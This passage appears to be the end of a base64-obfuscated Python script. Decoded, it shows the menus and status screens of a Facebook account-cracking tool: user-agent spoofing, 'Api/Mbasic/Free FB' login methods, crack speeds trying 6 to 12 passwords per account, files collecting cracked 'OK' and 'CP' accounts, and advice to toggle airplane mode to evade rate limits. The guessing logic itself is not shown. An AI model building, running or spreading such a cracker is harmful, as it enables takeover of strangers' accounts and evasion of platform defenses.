CAg4oCiICVzUm9taSBSaXphbCclKE8sUCkpDQogICAgbWxha3UoJyVz4pWRICAgICDigKIgJXNSZWhtYXQnJShPLFApKQ0KICAgIG1sYWt1KCclc+KVkSAgICAg4oCiICVzRmFsbCBYYXZpZXInJShPLFApKQ0KICAgIG1sYWt1KCclc+KVkSclKE8pKQ0KZGVmIHZhcl91Z2VuKCk6DQogICAgcHJpbnQoIiVz4p2l4pSBWyVzMSVzXSAlc0dldCBVc2VyIEFnZW50IiUoTyxQLE8sUCkpDQogICAgcHJpbnQoIiVz4p2l4pSBWyVzMiVzXSAlc0NoYW5nZSBVc2VyIEFnZW50JXMoJXNNYW51YWwlcykiJShPLFAsTyxQLE8sUCxPKSkNCiAgICBwcmludCgiJXPinaXilIFbJXMzJXNdICVzQ2hhbmdlIFVzZXIgQWdlbnQgJXMoJXNBZGp1c3QgSFAlcykiJShPLFAsTyxQLE8sUCxPKSkNCiAgICBwcmludCgiJXPinaXilIFbJXM0JXNdICVzRGVsZXRlIFVzZXIgQWdlbnQiJShPLFAsTyxQKSkNCiAgICBwcmludCgiJXPinaXilIFbJXM1JXNdICVzQ2hlY2sgVXNlciBBZ2VudCIlKE8sUCxPLFApKQ0KICAgIHByaW50KCIlc+KdpeKUgVslczAlc10gJXNSZXR1cm4iJShPLFAsTyxQKSkNCmRlZiBzdGFydF9tZXRob2QoKToNCiAgICBwcmludCgnJXPinaXilIEnJShPKSkNCiAgICBwcmludCgnJXPinaXilIFbJXMxJXNdICVzTWV0aG9kIEFwaSclKE8sUCxPLFApKQ0KICAgIHByaW50KCclc+KdpeKUgVslczIlc10gJXNNZXRob2QgTWJhc2ljJyUoTyxQLE8sUCkpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVzMyVzXSAlc01ldGhvZCBGcmVlIEZCJyUoTyxQLE8sUCkpDQpkZWYgc3RhcnRfbWV0aG9kZXp6KCk6DQogICAgcHJpbnQoJyVz4p2l4pSBJyUoTykpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVzMSVzXSAlc0Zhc3QgQ3JhY2sgJXNbJXM2IHBhc3Mlc10nJShPLFAsTyxQLE8sUCxPKSkNCiAgICBwcmludCgnJXPinaXilIFbJXMyJXNdICVzU2xvdyBDcmFjayAlc1slczkgcGFzcyVzXSclKE8sUCxPLFAsTyxQLE8pKQ0KICAgIHByaW50KCclc+KdpeKUgVslczMlc10gJXNWZXJ5IFNsb3cgQ3JhY2sgJXNbJXMxMiBwYXNzJXNdJyUoTyxQLE8sUCxPLFAsTykpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVzNCVzXSAlc0NyYWNrIFBhc3N3b3JkIENvbWJpbmUnJShPLFAsTyxQKSkNCmRlZiBzdGFydGVkKCk6DQogICAgcHJpbnQoJyVz4p2l4pSBJyUoTykpDQogICAgcHJpbnQoJyVz4p2l4pSBWyVz4oCiJXNdICVzQ3JhY2sgSXMgUnVubmluZy4uLiclKE8sUCxPLFApKQ0KICAgIHByaW50KCclc+KdpeKUgVslc+KAoiVzXSAlc0FjY291bnQgW09LXSBTYXZlZCBUbyBPSy8lcy50eHQnJShPLFAsTyxQLHRhbmdnYWwpKQ0KICAgIHByaW50KCclc+KdpeKUgVslc+KAoiVzXSAlc0FjY291bnQgW0NQXSBTYXZlZCBUbyBDUC8lcy50eHQnJShPLFAsTyxQLHRhbmdnYWwpKQ0KICAgIHByaW50KCclc+KdpeKUgVslc+KAoiVzXSAlc0FjdGl2YXRlIEFpcnBsYW5lIE1vZGUgWzUgU2Vjb25kcyBPbmx5XSBFdmVyeSA1IE1pbnV0ZXNcbiclKE8sUCxPLFApKQ0KZGVmIGZvbGRlcigpOg0KICAgIHRyeTpvcy5ta2RpcigiQ1AiKQ0KICAgIGV4Y2VwdDpwYXNzDQogICAgdHJ5Om9zLm1rZGlyKCJPSyIpDQogICAgZXhjZXB0OnBhc3MNCmlmIF9fbmFtZV9fPT0nX19tYWluX18nOg0KICBvcy5zeXN0ZW0oJ2dpdCBwdWxsJykNCiAgZm9sZGVyKCkNCiAgbWVudSgpDQojIE1hdSBOZ2FwYWluIEN1az8="))